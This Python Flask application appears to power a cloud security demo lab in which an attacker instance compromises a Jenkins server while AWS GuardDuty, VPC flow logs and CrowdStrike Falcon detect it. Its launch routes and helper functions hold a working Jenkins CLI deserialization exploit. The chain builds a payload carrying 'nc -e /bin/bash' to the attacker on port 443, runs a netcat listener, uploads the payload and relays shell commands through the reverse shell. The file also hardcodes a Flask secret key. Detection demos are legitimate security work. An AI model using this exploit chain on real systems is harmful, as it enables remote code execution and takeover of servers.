import json
import logging
import os
import subprocess
import threading
import time
import uuid
from datetime import datetime, timedelta

import boto3
import nmap
import pexpect
import requests
from flask import Flask
from flask import render_template, request, jsonify, make_response

attacker_ip = os.environ['ATTACKER']
target_ip = os.environ['VICTIM']
region = os.environ['REGION']
log_group = os.environ['LOG_GROUP']

gd_events_of_interest = ['Recon:EC2/PortProbeUnprotectedPort',
                         'Recon:EC2/Portscan',
                         'CryptoCurrency:EC2/BitcoinTool.B!DNS',
                         'UnauthorizedAccess:EC2/SSHBruteForce',
                         ]

ssm_client = boto3.client('ssm', region_name=region)
ec2_client = boto3.client('ec2', region_name=region)

app = Flask(__name__)
logging.basicConfig(filename='app.log', level=logging.DEBUG)
logger = logging.getLogger()

app.config['SECRET_KEY'] = 'c27e5a04065046f45a88300d80baa8cd'


@app.route("/installfalcon", methods=['POST'])
def run_install_package():
    if request.is_json:
        logger.info(request.data)
        payload = request.get_json()
        aids = []
        instance_ids = []
        instances_to_delete = []
        package_name = payload.get('package_name')
        action = payload.get('action')
        instance_ids_list = payload.get('instance_ids')
        document_name = payload.get('document_name')
        parameters = {
            'action': [action],
            'installationType': ['Uninstall and reinstall'],
            'name': [package_name]
            # 'version': ['']
        }
        if action == "Uninstall":
            # instance_ids will be a dictionary with instanceId and aid
            for instance in instance_ids_list:
                instanceId = instance.get("instanceId")
                aid = instance.get("aid")
                aids.append(aid)
                action = "hide_host"
                instances_to_delete.append(instanceId)
                # Remove the instance from the falcon console.
                manage_falcon_host(aids, action)
                data = ssm_install_command(action, document_name, instances_to_delete, parameters)
        else:
            instances_to_install = instance_ids_list
            data = ssm_install_command(action, document_name, instances_to_install, parameters)
        res = make_response(jsonify(
            data), 200)
        res.headers['Content-type'] = 'application/json'
        return res


def ssm_install_command(action: str, document_name: str, instance_ids: list, parameters: dict) -> dict:
    """

    :param action: "Install" / "Uninstall"
    :param document_name: Falcon Package Name
    :param instance_ids: AWS Instanceid
    :param parameters:
     parameters = {
            'action': [action],
            'installationType': ['Uninstall and reinstall'],
            'name': [package_name]
            # 'version': ['']
        }
    :return:
    """
    try:
        ssm_client = boto3.client('ssm', region_name=region)
        response = ssm_client.send_command(
            InstanceIds=instance_ids,
            DocumentName=document_name,
            TimeoutSeconds=300,
            Comment='Install package',
            Parameters=parameters
        )
        n = 6
        while n > 0:
            if response.get('Command'):
                cmd_status = ssm_client.list_commands(CommandId=response['Command']['CommandId'])
                cmd_status = cmd_status['Commands'][0]['Status']
                if cmd_status == 'Pending' or cmd_status == 'InProgress':
                    time.sleep(5)
                    # Wait up to 30 secs for response
                    n -= 1
                else:
                    break

        if cmd_status == "Success":
            msg = "Action: " + action + " Falcon: Success"
        else:
            msg = "Action: " + action + " Falcon: Failure"
        data = {"Result": cmd_status,
                "message": msg}
        res = make_response(jsonify(
            data), 200)
        res.headers['Content-type'] = 'application/json'
    except Exception as e:
        logger.info('Got Exception {}'.format(e))
        data = {"Result": "Error: {}".format(e)}
    return data


@app.route("/vpclogs", methods=['POST'])
def query_vpc_logs():
    _flow_logs = []
    if request.is_json:
        logger.info(request.data)
        payload = request.get_json()
        time_interval = payload.get('time_interval', '')
        time_value = float(payload.get('time_value', ''))
        log_group_name = payload.get('log_group_name', '')
        query_string = payload.get('query_string', '')

        if time_interval == "hours":
            last_time = int((datetime.today() - timedelta(hours=float(time_value))).timestamp())
        elif time_interval == "minutes":
            last_time = int((datetime.today() - timedelta(minutes=float(time_value))).timestamp())
        elif time_interval == "seconds":
            last_time = int((datetime.today() - timedelta(seconds=float(time_value))).timestamp())
        else:
            last_time = int((datetime.today() - timedelta(days=float(time_value))).timestamp())
        print('last_time is {}'.format(last_time))
        client = boto3.client('logs', region_name=region, verify=None)
        try:
            query = client.start_query(
                logGroupName=log_group_name,
                queryString=query_string,
                startTime=int(datetime.today().timestamp()) - last_time,
                endTime=int(datetime.now().timestamp()),
                limit=5
            )
            while check_for_running_queries(log_group_name):
                time.sleep(2)
                _response = client.get_query_results(queryId=query['queryId'])
                for _result in _response.get("results"):
                    _flow_logs.append(_result[1]["value"])
                _flow_log_dict = {
                    "Headings": ["version", "account", "interfaceid", "srcaddress", "dstaddress",
                                 "srcport", "dstport", "proto", "pkts", "bytes", "starttime",
                                 "endtime", "action", "status"],
                    "logs": _flow_logs}
        except Exception as e:
            print('Got Exception {}'.format(e))
            print(query['queryId'])
    else:
        _flow_log_dict = {"logs": "unexpected-request-format"}
    res = make_response(jsonify(
        _flow_log_dict), 200)
    res.headers['Content-type'] = 'application/json'
    return res


@app.route("/", methods=['GET'])
def home():
    if request.method == 'GET':
        return render_template('routing/index.html')


@app.route("/labinfra", methods=['GET'])
def labinfra():
    if request.method == 'GET':
        return render_template('routing/labinfra.html')


@app.route("/awssec", methods=['GET'])
def awssec_info():
    if request.method == 'GET':
        return render_template('routing/awssec.html')


@app.route("/vulnerability", methods=['GET'])
def vulnerability_info():
    if request.method == 'GET':
        return render_template('routing/vulnerability.html')

@app.route("/exploitcli", methods=['GET'])
def exploitcli():
    if request.method == 'GET':
        return render_template('routing/exploitcli.html')


@app.route("/nmap", methods=['POST'])
def nmap_host():
    if request.method == 'POST':
        # target_ip = request.form.get('target')
        try:
            nm = nmap.PortScanner()
            scan_res = nm.scan(target_ip, arguments='-Pn -p80,443')
            result = {"Success": scan_res}
        except Exception as e:
            result = {"Error": "nmap scan failed"}

        res = make_response(jsonify(
            result), 200)
        res.headers['Content-type'] = 'application/json'
        return res


@app.route("/gdquerybyfilter", methods=['POST'])
def query_gd_by_filter():
    if request.method == 'POST':
        if request.is_json:
            logger.info(request.data)
            payload = request.get_json()
        gd_client = boto3.client('guardduty', region_name=region)
        instanceList = payload.get('instanceList')
        data = ()
        fc = {"Criterion": {"resource.instanceDetails.instanceId": {"Eq": instanceList}}}
        guard_duty_findings = get_findings(fc)
        DetectorId = get_detector()
        _print_finding = lambda DetectorId, FindingId: gd_client.get_findings(
            DetectorId=DetectorId,
            FindingIds=[
                FindingId,
            ]
        )

        # keep findinds in a buffer - in case we'd like to do text manipulation later on
        findings_buffer = []
        # Print all findings in JSON format
        for _find in guard_duty_findings['FindingIds']:
            _find = (_print_finding(DetectorId, _find))
            findings_buffer.append(_find['Findings'][0])

        # print to terminal (comment out this line if the list is too long, use text file instead)
        results = {"results": findings_buffer}

        # print the count of findings for the given severity.
        res = make_response(jsonify(
            results), 200)
        res.headers['Content-type'] = 'application/json'
        return res


@app.route("/gdquery", methods=['POST'])
def query_gd():
    if request.method == 'POST':
        if request.is_json:
            logger.info(request.data)
            payload = request.get_json()
        events_of_interest = payload.get('events_of_interest')
        gd_client = boto3.client('guardduty', region_name=region)
        DetectorId = get_detector()
        gd_findings = gd_client.list_findings(
            DetectorId=DetectorId
        )

        # print all findings
        _print_finding = lambda DetectorId, FindingId: gd_client.get_findings(
            DetectorId=DetectorId,
            FindingIds=[
                FindingId,
            ]
        )

        # keep findinds in a buffer - in case we'd like to do text manipulation later on
        findings_buffer = []
        # Print all findings in JSON format
        for _find in gd_findings['FindingIds']:
            _find = (_print_finding(DetectorId, _find))
            if _find['Findings'][0]['Type'] in events_of_interest:
                findings_buffer.append(_find['Findings'][0])

        # print to terminal (comment out this line if the list is too long, use text file instead)
        results = {"results": findings_buffer}

        # print the count of findings for the given severity.
        res = make_response(jsonify(
            results), 200)
        res.headers['Content-type'] = 'application/json'
        print(res)
        return res


@app.route("/headers", methods=['POST'])
def http_headers():
    logger.info(request.data)
    payload = request.get_json()

    response = requests.get('http://' + target_ip)
    headers_dict = {}
    print(response)
    ignore_headers = ["Cache-Control", "Date", "Expires"]
    for k, v in response.headers.items():
        if k in ignore_headers:
            logger.info('Ignoring header {}'.format(k))
        else:
            headers_dict[k] = v
            # print('{}:{}'.format(k, v))

    res = make_response(jsonify(
        headers_dict), 200)
    res.headers['Content-type'] = 'application/json'
    print(res)
    return res


@app.route("/investigate", methods=['GET'])
def get_exploit_db():
    data = 'Source: https://blogs.securiteam.com/index.php/archives/3171\n\n' \
           'Vulnerability Details\n\n' \
           'Jenkins is vulnerable to a Java deserialization vulnerability. \n' \
           'In order to trigger the vulnerability two requests need to be sent.\n' \
           'The vulnerability can be found in the implementation of a bidirectional communication channel \n' \
           '(over HTTP) which accepts commands. The first request starts a session for the bi-directional \n' \
           'channel and is used for “downloading” data from the server. The HTTP header “Session” is the \n' \
           'identifier for the channel. \n\n' \
           'The HTTP header “Side” specifies the “downloading/uploading” direction. The second request is the \n' \
           'sending component of the bidirectional channel. The first requests is blocked until the second \n' \
           'request is sent. The request for a bidirectional channel is matched by the “Session” HTTP header \n' \
           ' which is just a UUID.\n\n' \
           'Proof of Concept\n\n' \
           'In order to exploit the vulnerability, an attacker needs to create a serialized payload with \nthe command' \
           'to execute by running the payload.jar script. The second step is to change python script \n' \
           'jenkins_poc1.py: \n\t- Adjust target url in URL variable\n\t' \
           '- Change file to open in line \n\t“FILE_SER = open(“jenkins_poc1.ser”, “rb”).read()” to your payload file.' \
           '\n\n' \
           'https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41965.zip'

    res = make_response(data)
    res.headers['Content-type'] = 'text/plain'
    return res




@app.route("/showinstances", methods=['GET'])
def show_managed_instances():
    auth_token = ''
    auth_header = ''
    tag_name = 'demo-purpose'
    tag_values = ['Jenkins', 'Attacker', 'Bastion']

    try:
        instance_list = []
        for tag_value in tag_values:
            aws_instance = aws_instance_list_from_tag(tag_name, tag_value)
            instance_list.extend(aws_instance)
            logger.info('instance list is {}'.format(instance_list))

        auth_token = get_auth_token()
        if auth_token:
            auth_header = "Bearer " + auth_token

        for instance in instance_list:
            falcon_aid = ''
            host_query_filter = "platform_name: 'Linux' + instance_id: '" + instance['AWS InstanceId'] + "'"
            fc = {"Criterion": {"resource.instanceDetails.instanceId": {"Eq": [instance['AWS InstanceId']]}}}
            try:
                guard_duty_findings = "Yes" if len(get_findings(fc)['FindingIds']) > 0 else "No"
            except:
                guard_duty_findings = "No"

            falcon_aid = query_falcon_host(auth_header, host_query_filter)
            if falcon_aid:
                falcon_instance_info = get_falcon_host_info(falcon_aid)
                instance["falcon_aid"] = falcon_aid
                instance["Falcon agent_version"] = falcon_instance_info.get("agent_version", 'None')
                instance["last_seen"] = falcon_instance_info.get("last_seen", 'None')
                instance["os_version"] = falcon_instance_info.get("os_version", 'None')
                instance["Falcon hostname"] = falcon_instance_info.get("hostname", 'None')
                instance["AWS Guard Duty Findings"] = guard_duty_findings

            else:
                instance["falcon_aid"] = 'None'
                instance["Falcon agent_version"] = 'None'
                instance["last_seen"] = 'None'
                instance["os_version"] = 'None'
                instance["Falcon hostname"] = 'None'
                instance["AWS Guard Duty Findings"] = guard_duty_findings
    except Exception as e:
        logger.info('Exception in show_managed_instances {}'.format(e))
    res = make_response(jsonify(
        instance_list), 200)
    res.headers['Content-type'] = 'application/json'
    return res


@app.route("/launch", methods=['GET', 'POST'])
def launch_phase1():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    managed_instances = get_managed_instances()

    if request.method == 'GET':
        return render_template('routing/phase1.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=gd_events_of_interest,
                               target_ip=target_ip)

    if request.method == 'POST':
        logger.info('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        print('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        if target_ip == "" or attacker_ip == "":
            logger.info('Incorrect Json format!')
            print(request.payload)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Incorrect Json format"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

        # Run auto_sploit.sh

        _launch_listener()
        logger.info('launching listener process')
        #
        # Create the payload from the attacker source ip input
        create_payload()

        # Run the exploit
        jenkins_cli_url = 'http://' + target_ip + ':80/cli'
        #
        # Get an initial session id with download
        session = exploit_get_sessionid(jenkins_cli_url)
        #
        if session:
            # Try and upload payload
            if upload_chunked(jenkins_cli_url, session, "asdf"):
                logger.info('Exploit_launched_ok')
                res = make_response(jsonify(
                    {
                        "result": "success",
                        "message": "SUCCESS - auto-sploit launched!"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
        else:
            logger.info('Failed to launch exploit')
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "ERROR - Unable to run exploit"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res

@app.route("/launch_phase2", methods=['GET', 'POST'])
def launch_phase2():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    managed_instances = get_managed_instances()

    if request.method == 'GET':
        return render_template('routing/phase2.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=gd_events_of_interest,
                               target_ip=target_ip)

    if request.method == 'POST':
        logger.info('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        print('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        if target_ip == "" or attacker_ip == "":
            logger.info('Incorrect Json format!')
            print(request.payload)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Incorrect Json format"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

        # Run auto_sploit.sh

        _launch_listener()
        logger.info('launching listener process')
        #
        # Create the payload from the attacker source ip input
        create_payload()

        # Run the exploit
        jenkins_cli_url = 'http://' + target_ip + ':80/cli'
        #
        # Get an initial session id with download
        session = exploit_get_sessionid(jenkins_cli_url)
        #
        if session:
            # Try and upload payload
            if upload_chunked(jenkins_cli_url, session, "asdf"):
                logger.info('Exploit_launched_ok')
                res = make_response(jsonify(
                    {
                        "result": "success",
                        "message": "SUCCESS - auto-sploit launched!"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
        else:
            logger.info('Failed to launch exploit')
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "ERROR - Unable to run exploit"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res

@app.route("/launch_phase3", methods=['GET'])
def launch_phase3():
    if request.method == 'GET':
        tag_name = 'demo-purpose'
        tag_values = ['Jenkins', 'Attacker', 'Bastion']
        instance_list = []
        managed_instances =[]
        aws_instances = []
        filter = [
            {
                'Name': 'tag:' + tag_name,
                'Values': tag_values
            },
            {
                'Name': 'instance-state-name',
                'Values': ['running']
            }
        ]
        aws_instances = aws_instance_by_filter(filter)
        for inst in aws_instances:
            instance_list.append(inst["Instances"][0]['InstanceId'])
        # fc = {"Criterion": {"resource.instanceDetails.instanceId": {"Eq": [instance['AWS InstanceId']]}}}
        managed_instances = get_managed_instances()
        return render_template('routing/phase3.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=instance_list)

@app.route("/launch_phase4", methods=['GET', 'POST'])
def launch_phase4():
    """
    Accepts a JSON payload with the following structure:
    {
        "target": "nlb-something.fqdn.com",
        "attacker": "1.2.3.4"
    }
    If the payload parses correctly, then launch a reverse shell listener using pexpect.spawn
    then spawn the auto-sploit.sh tool and enter the target and attacker info again using pexpect
    :return: Simple String response for now
    """

    managed_instances = get_managed_instances()

    if request.method == 'GET':
        return render_template('routing/phase4.html', log_group=log_group, attacker_ip=attacker_ip,
                               managed_instances=managed_instances, gd_events_of_interest=gd_events_of_interest,
                               target_ip=target_ip)

    if request.method == 'POST':
        logger.info('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        print('Attacker is {} and Victim is {}'.format(attacker_ip, target_ip))
        if target_ip == "" or attacker_ip == "":
            logger.info('Incorrect Json format!')
            print(request.payload)
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "ERROR - Incorrect Json format"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

        # Run auto_sploit.sh

        _launch_listener()
        logger.info('launching listener process')
        #
        # Create the payload from the attacker source ip input
        create_payload()

        # Run the exploit
        jenkins_cli_url = 'http://' + target_ip + ':80/cli'
        #
        # Get an initial session id with download
        session = exploit_get_sessionid(jenkins_cli_url)
        #
        if session:
            # Try and upload payload
            if upload_chunked(jenkins_cli_url, session, "asdf"):
                logger.info('Exploit_launched_ok')
                res = make_response(jsonify(
                    {
                        "result": "success",
                        "message": "SUCCESS - auto-sploit launched!"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
        else:
            logger.info('Failed to launch exploit')
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "ERROR - Unable to run exploit"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res

# @app.route("/launch_phase4", methods=['GET'])
# def launch_phase4():
#     if request.method == 'GET':
#         tag_name = 'Name'
#         tag_values = ['Jenkins', 'Attacker', 'Bastion']
#         instance_list = []
#         filter = [
#             {
#                 'Name': 'tag:' + tag_name,
#                 'Values': tag_values
#             },
#             {
#                 'Name': 'instance-state-name',
#                 'Values': ['running']
#             }
#         ]
#         aws_instances = aws_instance_by_filter(filter)
#         for inst in aws_instances:
#             instance_list.append(inst["Instances"][0]['InstanceId'])
#         # fc = {"Criterion": {"resource.instanceDetails.instanceId": {"Eq": [instance['AWS InstanceId']]}}}
#         managed_instances = get_managed_instances()
#         return render_template('routing/phase4.html', log_group=log_group, attacker_ip=attacker_ip,
#                                managed_instances=managed_instances, gd_events_of_interest=instance_list)

@app.route("/send", methods=['POST'])
def send_cmd():
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            logger.info('Got request data {}'.format(data))

            cli = data.get('cli', '')
            if cli == '':
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "No command in payload"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

        if 'listener' in app.config:
            logger.info('We have a listener already up!')
            listener = app.config.get('listener', '')
            if not hasattr(listener, 'isalive') or not listener.isalive():
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "No Listener active"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res

            logger.info('Sending initial command to see where we are!')
            listener.sendline('echo $SHLVL\n')
            found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after sending echo is now: ' + str(found_index))
            if found_index == 0:
                # no prompt yet
                logger.info('We have a connection sending python -c import pty......')
                listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
            elif found_index > 2:
                logger.info('Could not understand the response to echo got EOF {}'.format(listener.before))
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index is now: ' + str(found_index))
            if found_index > 1:
                logger.info(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "Listener connection error"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            listener.sendline(cli)
            found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
            logger.info('Found index after cli is now: ' + str(found_index))
            if found_index > 1:
                print(listener)
                res = make_response(jsonify(
                    {
                        "result": "error",
                        "message": "sent cli cmd but didnt get the expected response"
                    }), 200)
                res.headers['Content-type'] = 'application/json'
                return res
            else:
                logger.info('response looks good')
                res = make_response(listener.before)
                res.headers['Content-type'] = 'text/plain'
                return res

        else:
            res = make_response(jsonify(
                {
                    "result": "error",
                    "message": "No Listener in app.config"
                }), 200)
            res.headers['Content-type'] = 'application/json'
            return res

    else:
        res = make_response(jsonify(
            {
                "result": "error",
                "message": "Invalid method"
            }), 200)
        res.headers['Content-type'] = 'application/json'
        return res


def _launch_listener():
    if 'listener' not in app.config:
        listener = pexpect.spawn('nc -lvp 443')
        fout = open("LOG.TXT", "wb")
        listener.logfile_read = fout
        found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
        if found_index != 0:
            return False
        app.config['listener'] = listener
        print('Listener ready')
        return True
    else:
        listener = app.config['listener']
        if hasattr(listener, 'isalive') and listener.isalive():
            return True
        else:
            listener = pexpect.spawn('nc -lvp 443')
            found_index = listener.expect(['listening', pexpect.EOF, pexpect.TIMEOUT])
            if found_index != 0:
                return False
            app.config['listener'] = listener
            return True


def check_for_running_queries(log_group_name):
    logs_client = boto3.client('logs', region_name=region, verify=None)
    res = logs_client.describe_queries(
        logGroupName=log_group_name,
        status='Running')
    if not res["queries"]:
        return False
    else:
        return True


def get_managed_instances():
    # Return list of dicts
    managed_instance_list = []
    filter_online = [{'Key': 'PingStatus', 'Values': ['Online', ]}, ]
    filter_crwd_managed = [{'Key': 'tag-key', 'Values': ['CRWD_MANAGED']}, ]
    response = ssm_client.describe_instance_information(Filters=filter_online)
    if response.get('InstanceInformationList'):
        for instance in response['InstanceInformationList']:
            # managed_instance_list.append({instance['InstanceId']: instance['ComputerName']})
            managed_instance_list.append(instance['InstanceId'])
    return managed_instance_list


def create_payload():
    attacker = os.environ['ATTACKER']
    args = ['java', '-jar', '/root/payload.jar', '/root/payload.ser']
    nc_string = 'nc -e /bin/bash ' + attacker + ' 443'
    args.append(nc_string)
    process = subprocess.Popen(list(args), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while process.poll() is None:
        logger.info('Compiling payload')
    payload_creation_status = process.poll()
    if payload_creation_status != 0:
        logger.info('Payload creation failed')
        return False
    else:
        logger.info('Payload created')
        return True


def upload_chunked(url, session, data):
    logger.info('Got target ip {} url is {}'.format(target_ip, url))
    logger.info('Uploading exploit {} {} {}'.format(url, session, data))
    headers = {"Side": "upload", 'Session': session,
               'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko)' \
                             ' Chrome/39.0.2171.95 Safari/537.36',
               'X-CSRF-Token': 'DEADC0DEDEADBEEFCAFEBABEDABBAD00DBB0', 'Accept-Encoding': None,
               'Transfer-Encoding': 'chunked', 'Cache-Control': 'no-cache'}
    # headers['Content-type'] = 'application/octet-stream'
    # headers['Content-Length'] = '335'
    try:
        r = requests.post(url, headers=headers, data=create_payload_chunked())
        logger.info('Got response {} {}'.format(r.status_code, r.text))
        if r.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        logger.info('Got exception {} trying to upload_chunked'.format(e))
        return False


def create_payload_chunked():
    PREAMBLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    PROTO = b'\x00\x00\x00\x00'
    with open("/root/payload.ser", "rb") as fh:
        FILE_SER = fh.read()
    yield PREAMBLE
    yield PROTO
    yield FILE_SER


def null_payload():
    yield b" "


def download(url, session):
    headers = {'Side': 'download'}
    # headers['Content-type'] = 'application/x-www-form-urlencoded'
    headers[
        'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    headers['X-CSRF-Token'] = 'DEADC0DEDEADBEEFCAFEBABEDABBAD00DBB0'
    headers['Session'] = session
    headers['Transfer-Encoding'] = 'chunked'
    r = requests.post(url, data=null_payload(), headers=headers, stream=True)
    print(r.content)


def exploit_get_sessionid(url):
    try:
        session = str(uuid.uuid4())

        t = threading.Thread(target=download, args=(url, session))
        t.start()
        logger.info("Starting thread for download /cli")
        time.sleep(1)
        print("pwn")
        # upload(URL, session, create_payload())
        return session
    except Exception as e:
        logger.info('Got exception {} starting thread'.format(e))
        return False


def get_ssm_secure_string(parameter_name):
    ssm = boto3.client("ssm", region_name=region)
    return ssm.get_parameter(
        Name=parameter_name,
        WithDecryption=True
    )


def get_auth_token():
    try:
        _client_id = get_ssm_secure_string('Falcon_ClientID')['Parameter']['Value']
        _client_secret = get_ssm_secure_string('Falcon_Secret')['Parameter']['Value']
        url = "https://api.crowdstrike.com/oauth2/token"

        payload = 'client_secret=' + _client_secret + '&client_id=' + _client_id
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        response = requests.request("POST", url, headers=headers, data=payload)
        if response.ok:
            _response_object = (response.json())
            _token = _response_object.get('access_token', '')
            if _token:
                return _token
            else:
                return
    except Exception as e:
        logger.info('Got Exception {} getting auth token'.format(e))
        return


def query_falcon_host(_auth_header, _host_filter):
    _url = "https://api.crowdstrike.com/devices/queries/devices/v1"
    _PARAMS = {"offset": 0,
               "limit": 10,
               "filter": _host_filter
               }
    _headers = {
        "Authorization": _auth_header
    }

    _response = requests.request("GET", _url, headers=_headers, params=_PARAMS)

    _json_obj = json.loads(_response.text.encode('utf8'))
    if len(_json_obj['resources']) != 0:
        return _json_obj['resources'][0]
    else:
        return


def aws_instance_by_filter(filter):
    result = ec2_client.describe_instances(Filters=filter)
    if len(result['Reservations']) != 0:
        return result['Reservations']
    else:
        return []


def aws_instance_list_from_tag(_tagname, _tagvalue):
    ec2_client = boto3.client('ec2', region_name=region)
    _Filter = [
        {
            'Name': 'tag:' + _tagname,
            'Values': [_tagvalue]
        },
        {
            'Name': 'instance-state-name',
            'Values': ['running']
        }
    ]
    try:
        result = ec2_client.describe_instances(Filters=_Filter)
        _instance_list = []
        if len(result['Reservations']) != 0:
            for _result in result['Reservations']:
                _instance_info = {
                    "AWS InstanceId": _result['Instances'][0]['InstanceId'],
                    "AWS EC2 Tagname": _tagvalue,
                }
                _instance_list.append(_instance_info)
        return _instance_list
    except Exception as e:
        logger.info('Got exeception {} calling describle instances'.format(e))


def get_falcon_host_info(_aid: str) -> dict:
    _url = "https://api.crowdstrike.com/devices/entities/devices/v1"
    _params = {"ids": _aid}
    _info = falcon_api_get(_url, _params)
    return (_info)


def get_auth_header(_auth_token: str) -> dict:
    if _auth_token:
        _auth_header = "Bearer " + _auth_token
        _headers = {
            "Authorization": _auth_header
        }
        return _headers


def falcon_api_get(_url, _params):
    _auth_token = get_auth_token()
    _headers = get_auth_header(_auth_token)
    _response = requests.request("GET", url=_url, headers=_headers, params=_params)

    _json_obj = json.loads(_response.text.encode('utf8'))
    if len(_json_obj['resources']) != 0:
        return _json_obj['resources'][0]
    else:
        return


def get_detector():
    gd_client = boto3.client('guardduty', region_name=region)
    detectors_list = gd_client.list_detectors()

    if not detectors_list["DetectorIds"]:
        print("GuardDuty is not enabled ... enable GuardDuty on master account")
        response = gd_client.create_detector(Enable=True);
        return
    else:
        detector_id = detectors_list['DetectorIds'][0]
    return detector_id


def get_findings(fc: dict):
    gd_client = boto3.client('guardduty', region_name=region)
    try:
        detector_id = get_detector()
        response = gd_client.list_findings(
            DetectorId=detector_id,
            FindingCriteria=fc,
            MaxResults=10
        )
        return response
    except Exception as e:
        print('Got exception getting Guardduty findings\n {}'.format(e))
        return


def manage_falcon_host(aid: list, action: str) -> bool:
    """

    :param aid:
    :param action:
    :return:
    """
    url = "https://api.crowdstrike.com/devices/entities/devices-actions/v2?action_name=" + action
    payload = json.dumps({"ids": aid})
    _auth_token = get_auth_token()
    _auth_header = get_auth_header(_auth_token)
    headers = {

        'Content-Type': 'application/json',
    }
    headers.update(_auth_header)
    try:
        response = requests.request("POST", url, headers=headers, data=payload)
        if response.status_code == 202:
            return True
        else:
            return False
    except Exception as e:
        logger.info('Got exception {} hiding host'.format(e))
        return False
